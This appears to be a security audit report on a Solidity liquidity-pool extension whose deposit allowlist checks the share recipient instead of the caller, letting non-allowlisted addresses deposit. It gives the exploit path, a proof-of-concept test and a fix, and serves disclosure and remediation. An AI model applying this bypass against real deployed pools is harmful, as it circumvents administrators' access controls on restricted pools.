Audit Report

## Title
`DepositAllowlistExtension.beforeAddLiquidity` gates on `owner` instead of `sender`, allowing non-allowlisted callers to bypass the deposit allowlist — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

## Summary

`DepositAllowlistExtension.beforeAddLiquidity` silently discards its first parameter (`sender`, the actual depositor) and instead checks `owner` (the LP-share recipient). Because `addLiquidity` accepts a caller-controlled `owner` argument with no validation, any non-allowlisted address can bypass the allowlist by supplying an allowlisted address as `owner`. This breaks the core access-control invariant of the extension.

## Finding Description

`MetricOmmPool.addLiquidity` passes `msg.sender` as `sender` and the caller-supplied `owner` as the LP-share recipient to `_beforeAddLiquidity`: [1](#0-0) 

`ExtensionCalling._beforeAddLiquidity` encodes both into the hook call in the correct order — `sender` first, `owner` second: [2](#0-1) 

Inside the extension, the first parameter (`sender`) is unnamed and therefore silently discarded. The guard reads `owner` — the LP-share recipient — not the address that pays tokens: [3](#0-2) 

The contract's own NatDoc states it "Gates `addLiquidity` by depositor address, per pool." The depositor is `sender` (`msg.sender` of `addLiquidity`), not `owner`. The `setAllowedToDeposit` setter also stores entries keyed by `depositor`: [4](#0-3) 

**Exploit path:** attacker calls `pool.addLiquidity(owner=allowlisted_victim, ...)`. The hook receives `(sender=attacker, owner=victim)`, discards `attacker`, and evaluates `allowedDepositor[pool][victim] == true` → check passes. The `addLiquidity` callback is invoked on `msg.sender=attacker`, so the attacker pays the tokens. LP shares are minted to `victim`. The attacker has deposited into a restricted pool without being allowlisted.

No existing guard in `addLiquidity` or `_beforeAddLiquidity` validates that `owner == msg.sender` or otherwise prevents this substitution. [5](#0-4) 

## Impact Explanation

A non-allowlisted attacker can add liquidity to any pool that uses `DepositAllowlistExtension` with a restricted depositor set. The attacker pays real tokens (via the liquidity callback), manipulates bin balances and share accounting on a curated pool, and circumvents the pool admin's explicit access control. This is a direct bypass of an admin-configured access boundary with fund-impacting consequences (unauthorized bin balance manipulation, LP share minting to an arbitrary address). Severity: **High** — broken core pool access control with direct fund impact on restricted pools.

## Likelihood Explanation

The `owner` parameter is freely caller-controlled with no validation in `addLiquidity`. Any address that knows one allowlisted address (trivially discoverable from `AllowedToDepositSet` events emitted by `setAllowedToDeposit`) can exploit this immediately. No privileged access, special setup, or non-standard token behavior is required. The attack is repeatable on every restricted pool using this extension. [6](#0-5) 

## Recommendation

Name and use the `sender` parameter instead of `owner` in `beforeAddLiquidity`:

```solidity
// Before (buggy):
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {

// After (fixed):
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
``` [3](#0-2) 

## Proof of Concept

```solidity
function test_nonAllowlistedAttackerBypassesDepositAllowlist() public {
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim"); // allowlisted

    // Pool admin allowlists victim only
    depositExtension.setAllowedToDeposit(address(pool), victim, true);
    assertFalse(depositExtension.isAllowedToDeposit(address(pool), attacker));

    // Fund and approve attacker
    token0.mint(attacker, 1e18);
    token1.mint(attacker, 1e18);
    vm.startPrank(attacker);
    token0.approve(address(pool), type(uint256).max);
    token1.approve(address(pool), type(uint256).max);

    // Attacker calls addLiquidity with owner=victim (allowlisted)
    // Expected: revert NotAllowedToDeposit — Actual: succeeds
    pool.addLiquidity(victim, 0, deltas, callbackData, "");
    vm.stopPrank();

    // Attacker still not allowlisted, but deposit succeeded
    assertFalse(depositExtension.isAllowedToDeposit(address(pool), attacker));
}
```

Call path: `attacker → pool.addLiquidity(owner=victim)` → `_beforeAddLiquidity(sender=attacker, owner=victim)` → `abi.encodeCall(beforeAddLiquidity, (attacker, victim, ...))` → extension discards `attacker`, checks `allowedDepositor[pool][victim] == true` → deposit proceeds, tokens taken from attacker, LP shares minted to victim. [7](#0-6) [3](#0-2)

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L182-196)
```text
  function addLiquidity(
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata callbackData,
    bytes calldata extensionData
  ) external nonReentrant(PoolActions.ADD_LIQUIDITY) returns (uint256 amount0Added, uint256 amount1Added) {
    if (deltas.binIdxs.length == 0) return (0, 0);
    if (deltas.binIdxs.length != deltas.shares.length) revert LiquidityDeltaLengthMismatch();
    _beforeAddLiquidity(msg.sender, owner, salt, deltas, extensionData);
    (amount0Added, amount1Added) = LiquidityLib.addLiquidity(
      _liquidityContext(), owner, salt, deltas, callbackData, binTotals, _binStates, _binTotalShares, _positionBinShares
    );
    _afterAddLiquidity(msg.sender, owner, salt, deltas, amount0Added, amount1Added, extensionData);
  }
```

**File:** metric-core/contracts/ExtensionCalling.sol (L88-99)
```text
  function _beforeAddLiquidity(
    address sender,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_ADD_LIQUIDITY_ORDER,
      abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
    );
  }
```

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L18-21)
```text
  function setAllowedToDeposit(address pool_, address depositor, bool allowed) external onlyPoolAdmin(pool_) {
    allowedDepositor[pool_][depositor] = allowed;
    emit AllowedToDepositSet(pool_, depositor, allowed);
  }
```

**File:** metric-periphery/contracts/extensions/DepositAllowlistExtension.sol (L32-42)
```text
  function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
      revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
  }
```
